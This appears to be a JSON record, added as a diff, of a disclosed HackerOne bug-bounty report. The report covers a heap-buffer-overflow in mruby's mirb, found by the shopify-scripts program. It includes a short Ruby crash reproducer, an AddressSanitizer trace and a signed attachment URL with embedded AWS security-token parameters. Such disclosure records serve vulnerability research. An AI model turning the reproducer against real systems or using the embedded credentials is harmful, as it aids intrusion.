@@ -1,0 +1,208 @@
+{
+  "id": 295380,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTUzODA=",
+  "url": "https://hackerone.com/reports/295380",
+  "title": "heap-buffer-overflow in OP_R_BREAK",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "none",
+  "readable_substate": "Resolved",
+  "created_at": "2017-12-05T16:02:46.828Z",
+  "submitted_at": "2017-12-05T16:02:46.828Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ahihi",
+    "url": "/ahihi",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/106/056/b44f0450b0a2fca355ff6f460bd05357f4b9912b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-01-17T22:44:09.044Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2017-12-18T22:43:54.561Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The following input demonstrates a crash:\n```\ndef z\n\te Array = a rescue \n\tlambda { yield }\nend\n\nz { break } \n\nArray[]\n```\nASAN report:\n```\n./mruby/bin/mirb 2084_out.rb\nmirb - Embeddable Interactive Ruby Shell\n\n => :z\n => nil\n(mirb):6: undefined method 'e' for main (NoMethodError)\n => nil\n=================================================================\n==15861==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61e000000c38 at pc 0x00010a4b569c bp 0x7ffee57faad0 sp 0x7ffee57faac8\nREAD of size 8 at 0x61e000000c38 thread T0\n    #0 0x10a4b569b in mrb_vm_exec vm.c:2084\n    #1 0x10a499ce4 in mrb_vm_run vm.c:930\n    #2 0x10a3fe30d in main mirb.c:567\n    #3 0x7fff7ab3e144 in start (libdyld.dylib:x86_64+0x1144)\n\n0x61e000000c38 is located 72 bytes to the left of 2560-byte region [0x61e000000c80,0x61e000001680)\nallocated by thread T0 here:\n    #0 0x10a8562d0 in wrap_realloc (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x592d0)\n    #1 0x10a486225 in mrb_default_allocf state.c:55\n    #2 0x10a599c68 in mrb_realloc_simple gc.c:206\n    #3 0x10a59a42a in mrb_realloc gc.c:220\n    #4 0x10a59af03 in mrb_malloc gc.c:242\n    #5 0x10a59af9d in mrb_calloc gc.c:260\n    #6 0x10a48e9c5 in stack_init vm.c:131\n    #7 0x10a48b11b in mrb_funcall_with_block vm.c:415\n    #8 0x10a48aa19 in mrb_funcall_with_block vm.c:393\n    #9 0x10a48a147 in mrb_funcall_argv vm.c:498\n    #10 0x10a4475f1 in mrb_obj_new class.c:1601\n    #11 0x10a539cf5 in mrb_exc_new_str error.c:32\n    #12 0x10a5433b1 in mrb_init_exception error.c:506\n    #13 0x10a488f24 in mrb_init_core init.c:42\n    #14 0x10a4861b7 in mrb_open_core state.c:42\n    #15 0x10a48638c in mrb_open_allocf state.c:102\n    #16 0x10a486357 in mrb_open state.c:94\n    #17 0x10a3fc6f8 in main mirb.c:391\n    #18 0x7fff7ab3e144 in start (libdyld.dylib:x86_64+0x1144)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow vm.c:2084 in mrb_vm_exec\nShadow bytes around the buggy address:\n  0x1c3c00000130: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x1c3c00000140: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x1c3c00000150: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x1c3c00000160: fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa\n  0x1c3c00000170: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n=>0x1c3c00000180: fa fa fa fa fa fa fa[fa]fa fa fa fa fa fa fa fa\n  0x1c3c00000190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x1c3c000001a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x1c3c000001b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x1c3c000001c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x1c3c000001d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07\n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==15861==ABORTING\nAbort trap: 6\n```\n\n## Impact\n\nCrash only on mirb",
+  "bounty_amount": "800.0",
+  "formatted_bounty": "$800",
+  "weakness": {
+    "id": 5,
+    "name": "Heap Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 244539,
+      "file_name": "2084_out.rb",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/244/539/19038f7fd8a7e84ea0093cd16696e1df7a3f0270/2084_out.rb?response-content-disposition=attachment%3B%20filename%3D%222084_out.rb%22%3B%20filename%2A%3DUTF-8%27%272084_out.rb&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2MGCBP7N%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T061252Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDg4MuGAI603TNIp3LaOmX0tOUsSfGXGAuawtNU8hBzJAiEAu7bko8qMWI20udxCApr12GcYLkLqP%2FXskF7ofQJKgbwqsgUIfxADGgwwMTM2MTkyNzQ4NDkiDK4gx%2F5FVHzJ731ZXyqPBSSDoBJo0MG6cOYHjcCNOg%2FC%2BnfhlcCY0lh%2BrFxbUo578TmeYrNFbt7gGo5cbFOETQc%2FYZCtGJSCHdfLfqBLI%2Fl7XSQneMH4dYTqo1uN9zYUNT8SSkaeBzTorLT07JMEveAu5B9yu5zGPpqRLXN2lipuPwenf0wU5K48hUG4RcKfWncWUm0ztc8GwO2mle2%2FoWATir%2ByF1qZ2R00Vs2DE5RSOy2S%2FyiOPoPXRFXJIu8HJ1DBX%2FCuEy%2B%2BlsZFWllLZgqYpFKvbIM1HRl%2BWU1R2CvUKR9W0V9HXE7m94CmBVn%2FK5fwWx96CKbSF2mEx%2FP8rvvVSUsYbCMDTdQtARkYtlAxd1zDQRuQnNePPiX5g8DGTooDXWIt6v6qTqmPwNFrJ1hkYYmmixGhmw9OlcKzessaMeWheiJQ08A1Tt0uiAiijuVm9njUWDXDAlKpjD05sTxpg5L4sQVI5Vp0Gcy2An5hZmchDuxegmlZ0ZFyMv06L4TKSLdp2f%2FSecsp1D2NG%2Bt40YkMVpzTVcJ%2BczCfQOUUknJGOJ4W%2FWjo6orOHwatAsw7VPKuuosWvBfRewoQfIii4R38xB47UxumN2IZacQQjQofmmAo8OmgnJ6hwyNVjnpUUhVilhqy0k4Oa0U1DM4G8Ic0in29YUGYGJpf0G7AN0IqJo5A%2BlK4rbf2aKavFCWuN3jQ7vO1qYg2jacUeSOhC76jua72pZ2ZiYzV4w81uhEycjRusRYtWbq0PTZyuRLxLPhOaD8C0J5yXaskcp%2B3pnFCTy42by3SSQRNT5gi4LbExZlrGrpzTkdX4xTOTpPRt0XRUWBMJrNHA%2BfCTtKKZJRX6XnjcqM9qCZmAi6zSgBW2BMNyDmyGHF%2FpwAwj8K30gY6sQE1mr6XcRbnGpg0jQayWbCaCpEJpPEV0R9W83YEe1JGBDTsQSet%2B0xJFpkyPeennPb%2BrKmlS43yHzclwG6SQwm%2FUrLo0R%2BkEPPiwkEKZZFiQpVywSeQP9oerZlFzYBM3edIP6Bl2w6UOxeSgkLrMRGKm07z6zH2C5B2yk225jNlJlPXatk1%2Fz%2BaiXyNxge4LfjLJ%2BXvmgL5RV%2FSU2wASU3JrnLlNMWz31KJx3NfWQwryrk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e42667cb305a4363917560323230acb70e3f798cc1a46260bf201e34ff4d73b8",
+      "file_size": 71,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-01-17T22:43:54.623Z",
+  "allow_singular_disclosure_after": -267262137.88129386,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "jensec",
+    "heeeeen",
+    "eveeez",
+    "cr4xerbik4sh",
+    "666reda",
+    "muzafarhussain"
+  ],
+  "severity": {
+    "rating": "none",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "295380",
+  "votes": 6,
+  "latest_disclosable_activity_at": "2018-01-17T22:44:09.067Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T14:12:52.646605",
+    "source": "https://hackerone.com/reports/295380.json",
+    "report_id": 295380
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTUzODA=",
+    "databaseId": "295380",
+    "title": "heap-buffer-overflow in OP_R_BREAK",
+    "url": "https://hackerone.com/reports/295380",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2018-01-17T22:44:09.044Z",
+    "created_at": "2017-12-05T16:02:46.828Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzU=",
+      "name": "Heap Overflow",
+      "external_id": "cwe-122"
+    },
+    "severity": {
+      "rating": "none",
+      "score": null
+    },
+    "reporter": {
+      "username": "ahihi"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE1NjY4",
+      "handle": "shopify-scripts",
+      "name": "shopify-scripts",
+      "url": "https://hackerone.com/shopify-scripts",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS82NzMwNg==",
+            "amount": "450.00",
+            "awarded_amount": "450.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2017-12-18T22:43:44.587Z"
+          }
+        },
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS82NzM3MQ==",
+            "amount": "350.00",
+            "awarded_amount": "350.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2017-12-19T14:37:20.676Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzI5NTM4MA==",
+    "_id": "295380",
+    "disclosed": true,
+    "votes": 6,
+    "latest_disclosable_activity_at": "2018-01-17T22:44:09.067Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTUzODA=",
+      "databaseId": "295380",
+      "title": "heap-buffer-overflow in OP_R_BREAK",
+      "url": "https://hackerone.com/reports/295380",
+      "disclosed_at": "2018-01-17T22:44:09.044Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE1NjY4",
+      "handle": "shopify-scripts",
+      "name": "shopify-scripts",
+      "url": "https://hackerone.com/shopify-scripts",
+      "currency": "usd"
+    }
+  }
+}
